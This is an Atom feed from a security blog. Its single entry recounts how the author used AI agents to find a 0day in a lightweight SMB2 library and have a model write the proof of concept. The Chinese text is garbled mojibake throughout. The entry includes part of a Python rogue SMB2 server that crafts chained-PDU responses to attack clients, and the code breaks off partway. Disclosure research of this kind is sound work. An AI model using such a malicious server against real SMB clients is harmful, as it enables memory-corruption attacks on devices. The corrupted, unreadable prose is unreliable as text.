<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="https://zjw1nd.github.io/atom.xml" rel="self"/>
  
  <link href="https://zjw1nd.github.io/"/>
  <updated>2025-08-28T03:02:22.816Z</updated>
  <id>https://zjw1nd.github.io/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>&quot;Vibe SecurityReserch&quot;: æˆ‘æ˜¯å¦‚ä½•ç”¨aiå‘ç°0dayå¹¶æ’°å†™pocçš„</title>
    <link href="https://zjw1nd.github.io/2025/08/26/Vibe-SecurityReserch-%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%94%A8ai%E5%8F%91%E7%8E%B00day%E5%B9%B6%E6%92%B0%E5%86%99poc%E7%9A%84/"/>
    <id>https://zjw1nd.github.io/2025/08/26/Vibe-SecurityReserch-%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%94%A8ai%E5%8F%91%E7%8E%B00day%E5%B9%B6%E6%92%B0%E5%86%99poc%E7%9A%84/</id>
    <published>2025-08-26T07:31:11.000Z</published>
    <updated>2025-08-28T03:02:22.816Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>æˆªæ­¢åˆ°è¯¥æ–‡æ¡£å‘å¸ƒï¼Œç›¸å…³æ¼æ´å‡å·²åœ¨å…¬å¸å†…éƒ¨å’Œä¸Šæ¸¸ä¿®å¤</p></blockquote><h1>æ•…äº‹çš„å¼€å§‹</h1><p>åœ¨æŸå®‰å…¨å®éªŒå®¤å®ä¹ æœŸé—´ï¼Œæˆ‘ä¸»è¦çš„å·¥ä½œæ˜¯å¼€å‘ä¸€ä¸ªåŸºäºå¤§æ¨¡å‹çš„æ¼æ´æ‰«æå·¥å…·ï¼Œç„¶åæŒ–ç‚¹æ¼æ´ï¼Œå› æ­¤æœ‰äº†è¿™ä¸ªç›®æ ‡ã€‚è¿™ä¸€ç›®æ ‡æ˜¯å…¬å¸å†…æŸäº›äº§å“çš„å¼€æºä¾èµ–ï¼Œå’Œä¸Šæ¸¸ä½œè€…æ²Ÿé€šçš„æ—¶å€™æåˆ°ï¼Œè¿™ä¸ªåº“çš„è®¡åˆ’æ˜¯ç”¨äºå„ç±»å°å‹åµŒå…¥å¼è®¾å¤‡å’Œè€å¼æ¸¸æˆæœºï¼ˆPS2, wii, xbox 360â€¦ï¼‰çš„ï¼Œå®Œå…¨ä¸æ¸…æ¥šä¸ºä»€ä¹ˆå¦‚æ­¤é‡è¦çš„ç»ˆç«¯è®¾å¤‡ä¼šç”¨åˆ°è¿™ä¸ªåº“ã€‚</p><h1>æ¼æ´æœ¬èº«</h1><h2 id="å®¡è®¡å…¥å£">å®¡è®¡å…¥å£</h2><p>è¿™ä¸ªåº“æ˜¯ä¸€ä¸ªè½»é‡åŒ–çš„SMBåè®®åº“ï¼Œå³å¾®è½¯ï¼ˆä¸»è¦å°±æ˜¯windowsï¼‰çš„è¿œç¨‹æ–‡ä»¶å…±äº«ã€‚é¡ºå¸¦ä¸€æï¼Œå¤§åé¼é¼çš„æ°¸æ’ä¹‹è“å°±æ˜¯windowsä¸Šè¿™ä¸ªsmbæœåŠ¡å‡ºçš„é—®é¢˜ã€‚</p><p>å…¶å®ä¸€å¼€å§‹ï¼Œæˆ‘æ˜¯å‘ç°å…¬å¸å†…å’Œä¸Šæ¸¸çš„commitä¿®æ”¹ä¸åŒæ­¥çš„ã€‚æœ‰è®¸å¤šæœ€æ–°çš„é—®é¢˜ä¿®å¤æ²¡æœ‰åŒæ­¥è¿‡æ¥ï¼Œç”šè‡³åŒ…æ‹¬ä¸€äº›å¾ˆç¦»è°±çš„æ ˆæº¢å‡ºé—®é¢˜ã€‚ä½†ä»”ç»†å®¡è®¡åå‘ç°ä¸»è¦çš„æ¼æ´éƒ½å­˜åœ¨äºæœåŠ¡ç«¯ï¼Œæˆ‘ä»¬è´Ÿè´£çš„äº§å“ä¸»è¦æ˜¯ä½¿ç”¨äº†å®¢æˆ·ç«¯ä»£ç ï¼ˆæ˜¯çš„ï¼Œè¿™ä¸ªåº“æ˜¯ä¸€å¥—ä»£ç ä¸¤ä¸ªé€»è¾‘ï¼ŒåŒä¸€ä¸ªå‡½æ•°å†…ä¼šæœ‰ä¸¤ç§ä¸åŒå®ç°ï¼Œä¸­é—´ç”¨å¤§é‡çš„smb2_is_serveråˆ¤æ–­å½“å‰æ˜¯æœåŠ¡ç«¯è¿˜æ˜¯å®¢æˆ·ç«¯ï¼‰ï¼Œå› æ­¤ä¾›åº”é“¾å®¡è®¡å°±æ²¡æœ‰è·å¾—ä»€ä¹ˆå¥½çš„æ”¶è·ã€‚ä½†æˆ‘ä¹Ÿåœ¨è¿™è¿‡ç¨‹ä¸­æ‘¸æ¸…äº†å¤§è‡´çš„å¤„ç†é€»è¾‘ï¼Œä¸»è¦æ˜¯æ‰¾åˆ°äº†å¤„ç†æ•°æ®åŒ…çš„æ ¸å¿ƒå…¥å£å‡½æ•°ã€‚</p><p>æ¥ä¸‹æ¥å°±ç›´æ¥ä¸Šå·¥å…·äº†ï¼Œç®€å•æ¥è®²ï¼Œå·¥å…·çš„é€»è¾‘å¾ˆç®€å•ç²—æš´ï¼Œé…ç½®å…¥å£ç‚¹åä¼šè‡ªåŠ¨è¿­ä»£æŸ¥æ‰¾å­å‡½æ•°è°ƒç”¨å¾€ä¸‹èµ°å¹¶å°è¯•æ‰«ææ¼æ´ã€‚æ‰«æå‡ºæ¥ä¹‹åå°±æ˜¯äººå·¥çš„æ ¸å®å·¥ä½œã€‚æˆ‘åˆ†åˆ«é€‰äº†æ•°æ®åŒ…å¤„ç†çš„å…¥å£è¿˜æœ‰è‡ªå¸¦æµ‹ä¾‹çš„ä¸»å‡½æ•°åšæ‰«æã€‚</p><div class="warning"><p><strong>PS:</strong> å°½ç®¡æˆ‘ä»¬æƒ³äº†å„ç§åŠæ³•é™ä½è¯¯æŠ¥ç‡ï¼Œä½†å®é™…æƒ…å†µæ¯”æˆ‘æƒ³è±¡çš„ä¸¥å³»å¾—å¤šã€‚åœ¨Cè¯­è¨€ä¸‹ï¼Œå¤§é‡çš„æŒ‡é’ˆï¼Œæ‹‰é•¿çš„æ§åˆ¶æµï¼Œå¤§æ¨¡å‹å¹»è§‰ç­‰ç­‰å› ç´ ä¼šå¯¼è‡´ä¸å¯é¿å…çš„è¯¯æŠ¥ï¼šå°½ç®¡å±€éƒ¨æ¥çœ‹å®ƒçš„ç¡®æœ‰æ¨¡å‹æŠ¥å‘Šçš„é—®é¢˜ï¼Œä½†å…¶å®ä»äººç±»å¼€å‘è€…è§†è§’ä¸‹è¿™é‡Œæ ¹æœ¬ä¸å¯èƒ½æ˜¯æ”»å‡»é¢ã€‚</p></div><div class="tips"><p>tip</p></div><div class="success"><p>info</p></div><h2 id="æ ¹å› åˆ†æ">æ ¹å› åˆ†æ</h2><p>æ ¹æœ¬åŸå› å…¶å®å¾ˆç®€å•ï¼Œè¿™ä¸ªåº“ä¸­å­˜åœ¨å¤ªå¤šçš„ç¼–ç æ¼æ´ï¼Œè€Œæˆ‘ä»¬çš„å·¥å…·è¯†åˆ«åˆ°äº†æ¯”è¾ƒä¸¥é‡çš„ä¸€ä¸ª</p><h1>çº¯ç²¹AIçš„pocï¼š</h1><p>ä¸‹é¢æ˜¯æˆ‘ç”¨vscodeçš„gpt-5 agentæ’°å†™çš„æ¼æ´pocã€‚è¿™ä¸ªPOCæˆ‘<strong>æ²¡æœ‰é˜…è¯»ä»»ä½•çš„å“ªæ€•ä¸€è¡Œä»£ç </strong>ï¼Œæ˜¯ç›´æ¥åœ¨å¯¹è¯ä¸Šä¸‹æ–‡ä¸­å‘Šè¯‰äº†å®ƒæ•´ä¸ªæ¼æ´çš„æˆå› ï¼Œè§¦å‘è·¯å¾„ï¼Œå®Œå…¨ç”±aiè‡ªä¸»ç¼–å†™çš„ã€‚å½“ç„¶åœ¨è·‘ä¸é€šçš„æ—¶å€™ï¼Œæˆ‘ä¼šé—®aiä¸ºä»€ä¹ˆå‘ç”Ÿäº†ä»€ä¹ˆï¼Œä½†è¿™ä¸ªpocæˆ‘çš„ç¡®æ²¡æœ‰è‡ªå·±æ”¹è¿‡ä»»ä½•ä¸€è¡Œä»£ç ï¼Œæ°¸è¿œæ˜¯<em>å¯¹è¯-è¿è¡Œ-åé¦ˆ</em>çš„å¾ªç¯ã€‚</p><p>æœ€ç»ˆï¼Œåœ¨å°†claude sonnet 4æ¢æˆgpt5åï¼Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">SMB2 é“¾å¼ PDU æµ‹è¯•æœåŠ¡å™¨</span></span><br><span class="line"><span class="string">ç”¨äºæµ‹è¯• SMB2 å®¢æˆ·ç«¯çš„é“¾å¼ PDU å¤„ç†èƒ½åŠ›</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"><span class="comment"># é…ç½®æ—¥å¿—</span></span><br><span class="line">logging.basicConfig(level=logging.INFO, <span class="built_in">format</span>=<span class="string">&#x27;[%(asctime)s] %(levelname)s: %(message)s&#x27;</span>)</span><br><span class="line">logger = logging.getLogger(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ArchSMB2TestServer</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">445</span>, debug_mode=<span class="literal">False</span></span>):</span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = port</span><br><span class="line">        self.clients_served = <span class="number">0</span></span><br><span class="line">        self.debug_mode = debug_mode</span><br><span class="line">        self.chain_count = <span class="number">3</span>  <span class="comment"># é“¾å¼PDUçš„é»˜è®¤æ•°é‡</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> self.debug_mode:</span><br><span class="line">            logging.getLogger().setLevel(logging.DEBUG)</span><br><span class="line">            logger.info(<span class="string">&quot;è°ƒè¯•æ¨¡å¼å·²å¯ç”¨&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_smb2_header</span>(<span class="params">self, command=<span class="number">0x0000</span>, status=<span class="number">0x00000000</span>, </span></span><br><span class="line"><span class="params">                          message_id=<span class="number">0</span>, session_id=<span class="number">0</span>, tree_id=<span class="number">0</span>, </span></span><br><span class="line"><span class="params">                          next_command=<span class="number">0</span>, flags=<span class="number">0x00000001</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;åˆ›å»ºæ ‡å‡† SMB2 å¤´éƒ¨ (64å­—èŠ‚)&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            header = struct.pack(<span class="string">&#x27;&lt;4s&#x27;</span>, <span class="string">b&#x27;\xFE\x53\x4D\x42&#x27;</span>)     <span class="comment"># Protocol: SMB2</span></span><br><span class="line">            header += struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">64</span>)                      <span class="comment"># StructureSize</span></span><br><span class="line">            header += struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">0</span>)                       <span class="comment"># CreditCharge</span></span><br><span class="line">            header += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, status)                  <span class="comment"># Status</span></span><br><span class="line">            header += struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, command)                 <span class="comment"># Command</span></span><br><span class="line">            header += struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">1</span>)                       <span class="comment"># CreditRequest</span></span><br><span class="line">            header += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, flags)                   <span class="comment"># Flags</span></span><br><span class="line">            header += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, next_command)            <span class="comment"># NextCommand â˜…å…³é”®</span></span><br><span class="line">            header += struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, message_id)              <span class="comment"># MessageId</span></span><br><span class="line">            header += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">0</span>)                       <span class="comment"># Reserved</span></span><br><span class="line">            header += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, tree_id)                 <span class="comment"># TreeId</span></span><br><span class="line">            header += struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, session_id)              <span class="comment"># SessionId</span></span><br><span class="line">            header += struct.pack(<span class="string">&#x27;&lt;16s&#x27;</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">16</span>)          <span class="comment"># Signature</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">return</span> header</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            logger.error(<span class="string">f&quot;åˆ›å»ºSMB2å¤´éƒ¨å¤±è´¥: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_negotiate_response_payload</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;åˆ›å»ºåå•†å“åº”è½½è·&quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># SMB2 NEGOTIATE Response ç»“æ„</span></span><br><span class="line">        payload = struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">65</span>)           <span class="comment"># StructureSize</span></span><br><span class="line">        payload += struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">0</span>)           <span class="comment"># SecurityMode</span></span><br><span class="line">        payload += struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">0x0311</span>)      <span class="comment"># DialectRevision (SMB 3.1.1)</span></span><br><span class="line">        payload += struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">0</span>)           <span class="comment"># NegotiateContextCount</span></span><br><span class="line">        payload += struct.pack(<span class="string">&#x27;&lt;16s&#x27;</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">16</span>) <span class="comment"># ServerGuid</span></span><br><span class="line">        payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">0x07</span>)        <span class="comment"># Capabilities</span></span><br><span class="line">        payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">65536</span>)       <span class="comment"># MaxTransactSize</span></span><br><span class="line">        payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">65536</span>)       <span class="comment"># MaxReadSize</span></span><br><span class="line">        payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">65536</span>)       <span class="comment"># MaxWriteSize</span></span><br><span class="line">        payload += struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="built_in">int</span>(time.time())) <span class="comment"># SystemTime</span></span><br><span class="line">        payload += struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="built_in">int</span>(time.time())) <span class="comment"># ServerStartTime</span></span><br><span class="line">        payload += struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">0</span>)           <span class="comment"># SecurityBufferOffset</span></span><br><span class="line">        payload += struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">0</span>)           <span class="comment"># SecurityBufferLength</span></span><br><span class="line">        payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">0</span>)           <span class="comment"># NegotiateContextOffset</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_session_setup_response</span>(<span class="params">self, message_id=<span class="number">0</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;åˆ›å»ºSMB2 Session Setupå“åº”&quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># åˆ›å»ºSession Setupå“åº”å¤´éƒ¨</span></span><br><span class="line">        header = self.create_smb2_header(</span><br><span class="line">            command=<span class="number">0x0001</span>,          <span class="comment"># SMB2_SESSION_SETUP</span></span><br><span class="line">            message_id=message_id,</span><br><span class="line">            next_command=<span class="number">0</span>,</span><br><span class="line">            status=<span class="number">0x00000000</span>,       <span class="comment"># STATUS_SUCCESS</span></span><br><span class="line">            flags=<span class="number">0x00000001</span>         <span class="comment"># SERVER_TO_REDIR</span></span><br><span class="line">        )</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> header:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Session Setup Response payload</span></span><br><span class="line">        payload = struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">9</span>)            <span class="comment"># StructureSize</span></span><br><span class="line">        payload += struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">0</span>)           <span class="comment"># SessionFlags</span></span><br><span class="line">        payload += struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span 